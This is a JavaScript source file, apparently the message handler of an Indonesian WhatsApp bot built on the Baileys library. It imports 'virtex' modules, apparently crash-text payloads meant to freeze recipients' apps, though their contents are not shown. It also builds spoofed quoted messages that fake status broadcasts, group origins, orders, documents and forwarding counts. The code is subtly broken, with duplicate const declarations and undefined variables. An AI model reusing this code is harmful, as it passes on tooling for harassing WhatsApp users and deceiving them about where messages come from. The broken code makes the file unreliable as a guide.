// 
/*
CREATOR BOT WHATSAPP

*/
//
const
	{
    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		MimetypeMap,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		ChatModification,
		processTime,
	} = require("@adiwajshing/baileys")

const dl = require('./lib/scraper.js')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const simple  = require('./lib/simple.js');
const WAConnection = simple.WAConnection(_WAConnection);
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const hx = require('hxz-api')
const cheerio = require('cheerio') 
const ffmpeg = require('fluent-ffmpeg')
//const imgbb = require('imgbb-uploader')
const { EmojiAPI } = require("emoji-api");
//const tik = require('tiktok-scraper-without-watermark')
//const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
//const fetch = require('node-fetch');
//const util = require('util')
//const Fb = require('fb-video-downloader');
//const twitterGetUrl = require("twitter-url-direct")
//const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
//const brainly = require('brainly-scraper')
const yts = require('yt-search')
//const crypto = require('crypto')
//const ms = require('parse-ms')
//const ms = import('parse-ms')
//const toMs = require('ms')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const _limit = JSON.parse(fs.readFileSync('./database/pengguna/limit.json'))
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
virgam = fs.readFileSync(`./image/virgam.jpeg`)
hypermod = fs.readFileSync(`./image/hypermod.jpeg`)
const fetch = require('node-fetch');

const { error } = require("qrcode-terminal")
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const user = JSON.parse(fs.readFileSync('./database/json/user.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    hyper.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit))
           return false
       }
     }

///Button Text
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
hyper.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await hyper.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
hyper.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await hyper.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
hyper.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await hyper.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
hyper.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}


//setting\\
banChats = true
prefix = setting.prefix // edit di setting.json
targetpc = setting.ownerNumber // edit di setting.json
owner = setting.ownerNumber // edit di setting.json
thumb = setting.thumb // edit di setting.json

fake = setting.fake // edit di setting.json
img = setting.img // edit di setting.json
botname = hypername // edit di setting.json
ownername = setting.ownername // edit di setting.json

cr = setting.cr // edit di setting.json
hit_today = [] // jangan diubah
blocked = [] // jangan diubah

ownerr = '94767043432' // jangan diubah
numbernye = '0' // jangan diubah
menu =`Queen Alexa 右`



ownerB: 'Only for bot owners!'
baterai = {
battery: "" || "Not detect",
isCharge: "" || false
}

//=================================================//
		module.exports = hyper = async (hyper, mek) => {
		  
		try {
		if (!mek.hasNewMessage) return
		mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == "status@broadcast") return;
		m = simple.smsg(hyper, mek);  
		global.blocked
		
    mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
    const {
      text,
      extendedText,
      contact,
      location,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
    const type = Object.keys(mek.message)[0];1;
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[$.\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[$.?/\\©^z+*,;]/gi) : '.'
    body = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'listResponseMessage') && mek.message.listResponseMessage.selectedDisplayText ? mek.message.listResponseMessage.selectedDisplayText : (type == 'listMessage') && mek.message.listMessage.description ? mek.message.listMessage.description : (type == 'listResponseMessage') && mek.message.listResponseMessage.singleSelectReply.selectedRowId ? mek.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'listResponseMessage') && mek.message.listResponseMessage.title ? mek.message.listResponseMessage.title : (type == 'buttonsResponseMessage') && mek.message.buttonsResponseMessage.selectedButtonId ? mek.message.buttonsResponseMessage.selectedButtonId : (type == 'buttonsMessage') && mek.message.buttonsMessage.contentText ? mek.message.buttonsMessage.contentText : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
    const q = args.join(" ");
		const botNumber = hyper.user.jid
		const botNumberss = hyper.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		
		const sender = mek.key.fromMe ? botNumber : isGroup ? mek.participant : mek.key.remoteJid
		 let senderr = mek.key.fromMe
      ? hyper.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		
		const senderNumber = sender.split("@")[0]
		const totalchat = await hyper.chats.all()
		const groupMetadata = isGroup ? await hyper.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isGroupAdmins = groupAdmins.includes(sender) || false

   const istMe = botNumber
   const isUser = user.includes(sender)
   const isOwner = senderNumber == owner || senderNumber == botNumber //|| mods.includes(se
   hyper.on("CB:action,,battery", json => {

	 const battery = json[2][0][1].value

	 const persenbat = parseInt(battery)
	 baterai.battery = `${persenbat}%`
	 baterai.isCharge = json[2][0][1].live
	 })
	 hyper.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await hyper.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await hyper.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `*Hallo* @${num.split('@')[0]}\nWelcome to the group *${mdata.subject}*\nDont mess around nDont forget the intro @${num.split('@')[0]} 🗣`
				let buff = await getBuffer(ppimg)
				hyper.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await hyper.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `*It doesn t matter if you went, so be careful* @${num.split('@')[0]}\n*Good Bye*`
				let buff = await getBuffer(ppimg)
				hyper.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
	hyper.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})	
			const katalog = (teks) => {
             res = hyper.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_© PoXKunZz_*", "thumbnail": hypermod, "surface": 'CATALOG' }}, {quoted:ftroli})
             hyper.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = hyper.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'bit.ly/ownerpbotpoxcrafts', "groupName": `${botname}`, "footerText": "*_© PoXKunZz_*", "jpegThumbnail": hypermod, "caption": teks}}, {quoted:finv})
            hyper.relayWAMessage(grup)
        }
        
                const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './temp' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './temp' + names + '.png'
                    let palak = './temp' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        hyper.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
        
        const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : 🍇 : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : 🍌 : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍇 : 🍇', 
        '🔔 : 🍐 : 🔔',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        

const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
        
        const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }

//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    hyper.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit))
           return false
       }
     }


   //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return client.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            hyper.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
                        hyper.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}

    //FUNCTION DATE
var ucapan = ''
 if (jam >= '04:00' && jam <= '06:00') {
 ucapanW = 'Subuh!'
 } else if (jam >= '06:00' && jam <= '10:00') {
 ucapanW = 'Pagi!'
 } else if (jam >= '10:00' && jam <= '14:00') {
 ucapanW = 'Siang!'
 } else if (jam >= '14:00' && jam <= '17:00') {
 ucapanW = 'Sorre!'
 } else if (jam >= '17:00' && jam <= '17:30') {
 ucapanW = 'Petang!'
 } else if (jam >= '17:30' && jam <= '18:10') {
 ucapanW = 'Magrib!'
 } else if (jam >= '18:10' && jam <= '04:00') {
 ucapanW = 'Malam!'
 } else {
 ucapanW = 'Malam!'
 }
function formatDate(n, locale = 'id') {
let d = new Date(n)
return d.toLocaleDateString(locale, {
weekday: 'long',
day: 'numeric',
month: 'long',
year: 'numeric',
hour: 'numeric',
minute: 'numeric',
second: 'numeric'
})
}
const d = new Date
const locale = 'id'
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
function kyun(seconds) {
function pad(s) {
return (s < 10 ? '0' : '') + s
}
var hours = Math.floor(seconds / (60 * 60))
var minutes = Math.floor(seconds % (60 * 60) / 60)
var seconds = Math.floor(seconds % 60)
return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
}
//END FJNCTION DATE

   
   /*
BY FRM untuk @⁨Ivanzz`⁩ @⁨FERDIz-AFK⁩ 
*/

		const ratee = ["106","106","106","106","106","106","106"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const conts = mek.key.fromMe ? hyper.user.jid : hyper.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? hyper.user.name : conts.notify || conts.vname || conts.name || '-'
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + jam + ":" + menit + ":" + detik ;   
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	             const dinane = `${thisDay} - ${day} - ${myMonths[bulan]} - ${year}`
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
	            	
		mess = {
			wait: 'Sedang di proses「 ⏳ 」',
			success: 'Succeed 「 ✅ 」',
			wrongFormat: 'Fail 「 ❎ 」',
			error: {
				stick: 'Format Error「 ❗ 」',
				Iv: 'Link Error「 ❗ 」'
			},
			only: {
				group: '```ONLY GROUP```',
			}
		}
		
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            hyper.sendMessage(from, teks, text, {quoted:mek})
        }

        const sendMess = (hehe, teks) => {
            hyper.sendMessage(hehe, teks, text)
        }
        
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? hyper.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : hyper.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            hyper.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumb}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            hyper.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${tee}.jpg`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            hyper.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumb}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":1,"isForwarded":true},sendEphemeral: true
            })
        }

    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./stik/200291700917_293357.jpg`), //Gambarnye
            },
            title: "TOKO ONLINE WAIFU", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "IDR",
            priceAmount1000: "2.000.000.000.000",
            retailerId: "FERDIZ-AFK",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };

        const ftroli ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 666,status: 200, thumbnail: fs.readFileSync(`image/${thumb}`), surface: 200, message: `‣  ${setting.botname}\n‣    ${setting.ownername} `, orderTitle: 'skiuwers', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: `${pushname}`,
          jpegThumbnail: fs.readFileSync(`image/${thumb}`)
        },
      },
    };



const fvideo  = (teks) => {
            hyper.sendMessage(from, teks, text, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { 
                 "videoMessage": { 
                 "title":"ONE DEV",
                 "h": `Hmm`,
                 'seconds': '99999', 
                 'caption': `${hahh} ${pushname}`,
                 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)
                        }}}})}
			
			
const fakeitem = (teks) => {
  hyper.sendMessage(from, teks, text, { quoted: { key:{ fromMe:false, participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumb}`),"itemCount":666,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
const fakedoc = (teks) => {  
  hyper.sendMessage(from, teks, text, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "hyper", "fileLength": "36", "pageCount": 0, "fileName": `hyperbot.zip`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})}
const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumb}`), thumbnail: fs.readFileSync(`image/${thumb}`),sendEphemeral: true}}}  
const hyperuhuy = (pesan, tipe, target, target2) => {
	hyper.sendMessage(from, pesan, tipe, { "contextInfo": {mentionedJid: [sender], "forwardingScore": 999,"isForwarded": true}, quoted: { "key": { "participant": `${target}`, "remoteJid": "393470602054-1351628616@g.us", "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream", "title": `${target2}`, "fileLength": "36", "pageCount": 0, "fileName": `${target2}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})}
const fdoc = {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"}}



const sendButText = (id, text, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
text: text,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "TEXT"
}
hyper.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}


    const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      hyper.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButImage = async (
      id,
      text1,
      desc1,
      gam1,
      but = [],
      options = {}
    ) => {
      kma = gam1;
      mhan = await hyper.prepareMessage(from, kma, image);
      const buttonMessages = {
        imageMessage: mhan.message.imageMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 4,
      };
      hyper.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };
    const sendButVideo = async (
      id,
      text1,
      desc1,
      vid1,
      but = [],
      options = {}
    ) => {
      kma = vid1;
      mhan = await hyper.prepareMessage(from, kma, video);
      const buttonMessages = {
        videoMessage: mhan.message.videoMessage,
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 5,
      };
      hyper.sendMessage(
        id,
        buttonMessages,
        MessageType.buttonsMessage,
        options
      );
    };






//FUNCTION
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
